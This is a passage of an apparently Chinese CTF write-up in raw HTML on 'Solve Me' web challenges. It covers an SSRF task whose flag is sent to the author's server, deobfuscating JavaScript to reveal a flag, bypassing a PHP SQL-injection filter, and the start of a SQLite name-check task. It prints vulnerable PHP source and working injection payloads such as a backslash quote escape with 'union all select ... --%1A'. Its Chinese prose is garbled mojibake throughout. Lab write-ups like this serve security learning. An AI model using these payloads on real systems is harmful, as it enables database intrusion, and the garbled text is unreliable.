class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">59</span>) <span class="string">"givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">12</span>) <span class="string">"/plz_give_me"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç„¶åå°±åˆ©ç”¨é‚£ä¸€ä¸ª<code>curl_setopt</code>å‡½æ•°å¾€æˆ‘ä»¬è¿™è¾¹æœåŠ¡å™¨å‘é€flagäº†ï¼Œvpsè¿™è¾¹ç›‘å¬80ç«¯å£,å‡ºç°flag</p><h3 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h3><p>ç‚¹å¼€å‘ç°å­˜åœ¨ä¸€å¤§å †Jsæ··æ·†ä»£ç ï¼Œè§£ç ä¸€çœ‹å‘ç°æœ‰ä¸€å †æ•°å­—å¾ˆå¯ç–‘<br><a href="https://imgchr.com/i/P28IQH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28IQH.md.png" alt="P28IQH.md.png"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;4&quot;+&quot;7&quot;,&quot;4&quot;+&quot;7&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;111&quot;,&quot;100&quot;,&quot;3&quot;+&quot;2&quot;,&quot;106&quot;,&quot;111&quot;,&quot;98&quot;,&quot;3&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;108&quot;,&quot;101&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;0&quot;+&quot;9&quot;,&quot;112&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;97&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;3&quot;+&quot;2&quot;,&quot;116&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;6&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;112&quot;,&quot;108&quot;,&quot;110&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;7&quot;,&quot;116&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;5&quot;+&quot;0&quot;,&quot;4&quot;+&quot;9&quot;,&quot;100&quot;,&quot;102&quot;,&quot;5&quot;+&quot;2&quot;,&quot;97&quot;,&quot;100&quot;,&quot;5&quot;+&quot;1&quot;,&quot;99&quot;,&quot;101&quot;,&quot;5&quot;+&quot;1&quot;,&quot;4&quot;+&quot;9&quot;,&quot;97&quot;,&quot;102&quot;,&quot;5&quot;+&quot;6&quot;,&quot;5&quot;+&quot;2&quot;,&quot;5&quot;+&quot;3&quot;,&quot;99&quot;,&quot;102&quot;,&quot;57&quot;,&quot;99&quot;,&quot;100&quot;,&quot;5&quot;+&quot;4&quot;,&quot;97&quot;,&quot;5&quot;+&quot;3&quot;,&quot;101&quot;,&quot;100&quot;,&quot;100&quot;,&quot;98&quot;,&quot;98&quot;,&quot;57&quot;,&quot;4&quot;+&quot;9&quot;,&quot;125&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;98&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;</span><br></pre></td></tr></table></figure></p><p>å†™ä¸ªå°è„šæœ¬è§£ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dit = [<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"111"</span>,<span class="string">"100"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"106"</span>,<span class="string">"111"</span>,<span class="string">"98"</span>,<span class="string">"3"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"9"</span>,<span class="string">"112"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"116"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"6"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"112"</span>,<span class="string">"108"</span>,<span class="string">"110"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"7"</span>,<span class="string">"116"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"5"</span>+<span class="string">"0"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"100"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"97"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"99"</span>,<span class="string">"101"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"6"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"99"</span>,<span class="string">"102"</span>,<span class="string">"57"</span>,<span class="string">"99"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"101"</span>,<span class="string">"100"</span>,<span class="string">"100"</span>,<span class="string">"98"</span>,<span class="string">"98"</span>,<span class="string">"57"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"125"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"98"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span></span><br><span class="line">]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dit:</span><br><span class="line">s = s + chr(int(i))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// good job!</span><br><span class="line"></span><br><span class="line">let flag = prompt(&quot;what is the flag?&quot;);</span><br><span class="line"></span><br><span class="line">if (flag === &quot;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;plnput&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else if (flag === &quot;flag&#123;21df4ad3ce31af845cf9cd6a5eddbb91&#125;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;bingo&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;wrong&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="AntiSQL"><a href="#AntiSQL" class="headerlink" title="AntiSQL"></a>AntiSQL</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'Anti SQLi' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $pw = $_GET[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($id, $pw))&#123;</span><br><span class="line">        preg_match(</span><br><span class="line">            <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">            <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">            <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span class="line">            <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">            <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">            $id.<span class="string">','</span>.$pw</span><br><span class="line">        ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br><span class="line"></span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                <span class="string">"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            <span class="keyword">if</span>($result[<span class="string">'no'</span>] === <span class="string">'31337'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>ç®€å•è¯´ä¸€ä¸‹è¿™æ®µä»£ç çš„æ„æ€ï¼Œå°±æ˜¯ä¼ è¿›ä¸¤ä¸ªå‚æ•°ï¼Œç„¶åè¿›è¡Œè¿‡æ»¤ï¼Œç„¶åè¿›è¡Œæ•°æ®åº“çš„æŸ¥æ‰¾ï¼ŒæŸ¥æ‰¾çš„ç»“æœé‡Œé¢å¦‚æœå«æœ‰<code>31337</code>çš„å°±å¯ä»¥æˆåŠŸè¾“å‡ºflagäº†</p><p>è¿™æ®µä»£ç é‡Œé¢æœ‰ä¸€ä¸ªå¾ˆå“å”¬äººçš„è¿‡æ»¤å‡†åˆ™ï¼Œä½†æ˜¯å…¶å®é‡Œé¢å­˜åœ¨å°æ¼æ´<br>    é¦–å…ˆè¿‡æ»¤äº†å•å¼•å·å•¥çš„ï¼Œæ³¨å…¥ä¸€ä¸ªå•å¼•å·è¡Œä¸é€šï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å»æ‰ä¸€ä¸ªå•å¼•å·ï¼Œå¦‚æœè¦æ­£åˆ™åŒ¹é…\çš„è¯ï¼Œæ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯ <code>|\\\\|</code>ä¹Ÿå°±æ˜¯è¯´ï¼Œåæ–œæ æ²¡æœ‰è¢«è¿‡æ»¤ã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥æ³¨å…¥åæ–œæ æŠŠidçš„ç¬¬äºŒä¸ªå•å¼•å·ç»™ææ‰ã€‚è¿™æ ·ä¸€æ¥å°±å¯ä»¥æ³¨å…¥äº†<br>ç¬¬äºŒç‚¹å°±æ˜¯ä»–é‚£ä¸ª<code>union[\s\xA0]+select</code>æŠŠæ‰€æœ‰éç©ºå­—ç¬¦éƒ½è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥è¯´ç›´æ¥ä¸Š<code>union select</code>æ˜¯ä¸å¤ªè¡Œçš„,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨<code>union all select</code>å»ç»•è¿‡<br>ç„¶åæ˜¯æ³¨é‡Šçš„é—®é¢˜ï¼Œå› ä¸ºæ­£åˆ™é‡Œé¢æ˜ç¡®æŠŠ<code>#</code>ï¼Œè¿˜æœ‰<code>--åŠ ä¸Šç©ºå­—ç¬¦</code>è¿‡æ»¤æ‰äº†ï¼Œé‚£æˆ‘ä»¬ç”¨<code>--%1a</code>æ³¨é‡Šä¹Ÿæ˜¯å¯ä»¥çš„<br>è¿˜æœ‰å› ä¸ºè¿™é‡Œ<code>order by</code> ä¹Ÿè¿‡æ»¤äº†ï¼Œåªèƒ½æ‰‹åŠ¨å»æµ‹è¯•åˆ—æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>å‘ç°å›æ˜¾çš„æ˜¯Login failedè¯´æ˜åˆ—æ•°ä¸å¯¹ï¼Œå†ç»§ç»­è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯login failed,å†ç»§ç»­è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2,3 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™å›æ˜¾Helloäº†ï¼Œä»£ç é€»è¾‘è·³åˆ°ç¬¬ä¸€ä¸ªifæ¡ä»¶é‡Œé¢ï¼Œè¯´æ˜æœ‰3åˆ—<br>ç„¶åæˆ‘ä»¬ç›´æ¥ä¸Špayload<br><code>?id=\&amp;pw=union all select 31337,2,3 from antisqli --%1A</code> ç›´æ¥å‡ºflag<br>è¿™é‡Œçš„è¯­å¥åœ¨æ•°æ®åº“é‡Œå¤§æ¦‚æ˜¯è¿™æ ·çš„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`antisqli`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span>=<span class="string">' \' and `pw` = md5('</span> <span class="keyword">union</span> all <span class="keyword">select</span> .... <span class="keyword">from</span> ... <span class="comment">--%1a</span></span><br></pre></td></tr></table></figure><p>é‡ç‚¹æ˜¯union allå‰é¢çš„è¯­å¥ä¸ºç©ºï¼Œç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œè¿™å¤ªçµæ´»äº†ï¼Œåˆå­¦åˆ°äº†</p><h3 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">"/admin|--|;|\(\)|\/\*|\\0/i"</span>, $name))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Not allowed input'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $sql = <span class="keyword">new</span> SQLite3(<span class="string">'name_check.db'</span>, SQLITE3_OPEN_READWRITE);</span><br><span class="line">       $res = $sql-&gt;query(<span class="string">"</span></span><br><span class="line"><span class="string">           SELECT </span></span><br><span class="line"><span class="string">           MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class="line"><span class="string">           INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class="line"><span class="string">           MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class="line"><span class="string">           SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class="line"><span class="string">       ;"</span>);</span><br><span class="line">       <span class="keyword">if</span>($res === <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Database error'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">       <span class="keyword">if</span>(</span><br><span class="line">           $row[<span class="number">0</span>] + $row[<span class="number">1</span>] + $row[<span class="number">2</span>] + $row[<span class="number">3</span>] !== <span class="number">4</span> ||</span><br><span class="line">           array_sum($row) !== <span class="number">4</span> </span><br><span class="line">       )&#123;</span><br><span class="line">           <span 